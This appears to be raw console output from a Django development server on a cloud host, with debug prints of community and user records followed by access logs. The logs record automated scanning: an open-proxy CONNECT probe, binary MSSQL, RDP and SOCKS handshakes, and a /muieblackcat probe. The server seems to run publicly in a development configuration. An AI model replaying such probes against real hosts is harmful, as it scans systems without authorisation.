: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
<QuerySet []>
[]
{}
<QuerySet []>
[]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
<QuerySet []>
[]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
<QuerySet []>
[]
{}
<QuerySet []>
[]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
<QuerySet []>
[]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': '', '_': '1544636467739'}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>[12/Dec/2018 17:43:55] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:43:55] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:43:56] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:43:56] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:44:03] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 17:44:03] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:44:04] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:44:04] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:44:05] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:44:33] "GET /community/4 HTTP/1.1" 301 0
[12/Dec/2018 17:44:34] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 17:44:34] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:44:35] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:44:36] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /community/4/logo.jpeg
[12/Dec/2018 17:44:37] "GET /community/4/logo.jpeg HTTP/1.1" 404 5994
[12/Dec/2018 17:44:38] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 17:44:38] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:44:39] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:44:40] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:44:40] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:45:15] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 17:45:15] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:45:15] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:45:16] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:45:17] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:45:22] "GET /community/4/members_list HTTP/1.1" 200 8316
[12/Dec/2018 17:45:22] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:45:30] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 17:45:31] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:45:31] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:45:32] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:45:34] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 17:45:34] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:45:35] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:45:35] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:45:36] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:46:29] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 17:46:29] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:46:30] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:46:31] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:46:32] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 17:47:37] "GET / HTTP/1.1" 400 62428
[12/Dec/2018 17:50:06] "GET / HTTP/1.1" 200 13948
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 19:06:44] "GET / HTTP/1.0" 400 62439
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 19:24:26] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 19:57:09] "GET / HTTP/1.0" 400 62436
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 19:57:44] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 20:17:43] "GET / HTTP/1.0" 400 62439
[12/Dec/2018 20:26:57] code 400, message Bad request syntax ('\x04\x01\x00P´£qR\x00')
[12/Dec/2018 20:26:57] " P´£qR " 400 -
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 20:35:56] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 20:53:41] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 21:30:17] "GET / HTTP/1.0" 400 62437
[12/Dec/2018 21:38:17] code 400, message Bad request syntax ('\x05\x02\x00\x02')
[12/Dec/2018 21:38:17] " " 400 -
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 21:45:59] "GET / HTTP/1.1" 400 62673
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: 'xui.ptlogin2.qq.com:443'. You may need to add 'xui.ptlogin2.qq.com' to ALLOWED_HOSTS.
Bad Request: /http:/18.220.31.143/
Bad Request: /
Bad Request: /xui.ptlogin2.qq.com:443
[12/Dec/2018 22:00:01] "GET http://18.220.31.143/ HTTP/1.1" 400 62369
[12/Dec/2018 22:00:01] "OPTION / HTTP/1.1" 400 62170
[12/Dec/2018 22:00:01] "CONNECT xui.ptlogin2.qq.com:443 HTTP/1.1" 400 62554
[12/Dec/2018 22:00:03] code 400, message Bad request version ('\x03\x00(\x00\x04ÿU\x01\x00\x08\x00\x00\x00MSSQLServer\x00d!\x00\x00')
[12/Dec/2018 22:00:03] " 4            ( ÿU    MSSQLServer d!  " 400 -
[12/Dec/2018 22:00:03] code 400, message Bad request syntax ('\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00M\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[12/Dec/2018 22:00:03] "  +<M    M                                                                                                                                           " 400 -
[12/Dec/2018 22:00:03] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
[12/Dec/2018 22:00:03] "  à          " 400 -
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 22:06:07] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 22:24:37] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 22:54:17] "GET / HTTP/1.0" 400 62435
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 22:55:38] "GET / HTTP/1.1" 400 62426
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 23:21:06] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 23:21:49] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 00:03:43] "GET / HTTP/1.1" 400 62433
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 00:08:40] "GET / HTTP/1.1" 400 62425
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 00:36:49] "GET / HTTP/1.1" 400 62434
Not Found: /robots.txt
[13/Dec/2018 00:39:34] "GET /robots.txt HTTP/1.1" 404 5961
[13/Dec/2018 00:39:38] "GET / HTTP/1.1" 200 13159
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 02:14:46] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 02:29:16] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 02:58:55] "GET / HTTP/1.0" 400 62439
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 03:02:42] "GET / HTTP/1.0" 400 62436
[13/Dec/2018 03:16:15] "GET /profile/4 HTTP/1.1" 302 0
[13/Dec/2018 03:16:18] "GET /accounts/login/?next=/profile/4 HTTP/1.1" 200 2576
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 04:09:14] "GET / HTTP/1.1" 400 62425
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 04:09:46] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 05:18:32] "GET / HTTP/1.0" 400 62439
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 05:30:03] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 05:35:04] "GET / HTTP/1.1" 400 62425
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 05:57:02] "GET / HTTP/1.0" 400 62437
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 06:09:56] "GET / HTTP/1.1" 400 62425
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 06:15:04] "GET / HTTP/1.0" 400 62439
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 06:57:39] "GET / HTTP/1.0" 400 62437
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 07:03:37] "GET / HTTP/1.1" 400 62433
Not Found: /robots.txt
[13/Dec/2018 07:08:16] "GET /robots.txt HTTP/1.1" 404 5961
[13/Dec/2018 07:08:20] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 07:34:26] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 08:34:08] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 08:38:35] "GET / HTTP/1.1" 400 62428
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 09:00:23] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 09:00:36] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 09:00:53] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 09:39:46] "GET / HTTP/1.0" 400 62437
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 09:55:34] "GET / HTTP/1.1" 400 62425
Not Found: /robots.txt
[13/Dec/2018 10:19:37] "GET /robots.txt HTTP/1.1" 404 5961
[13/Dec/2018 10:19:41] "GET /profile/5 HTTP/1.1" 302 0
[13/Dec/2018 10:19:45] "GET /accounts/login/?next=/profile/5 HTTP/1.1" 200 2576
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 10:54:12] "GET / HTTP/1.0" 400 62439
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 10:54:29] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 10:58:33] "GET / HTTP/1.1" 400 62149
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[13/Dec/2018 10:58:33] "GET / HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('91.195.230.90', 38392)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 11:20:53] "GET / HTTP/1.0" 400 62439
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 11:24:28] "GET / HTTP/1.0" 400 62437
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 11:38:15] "GET / HTTP/1.0" 400 62436
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 11:38:48] "GET / HTTP/1.0" 400 62437
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 12:08:26] "GET / HTTP/1.0" 400 62437
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 12:11:41] "GET / HTTP/1.1" 400 62426
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 12:31:24] "GET / HTTP/1.1" 400 62426
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[13/Dec/2018 12:34:13] "GET / HTTP/1.1" 400 62425
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /muieblackcat
[13/Dec/2018 12:38:05] "GET /muieblackcat HTTP/1.1" 400 62805
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
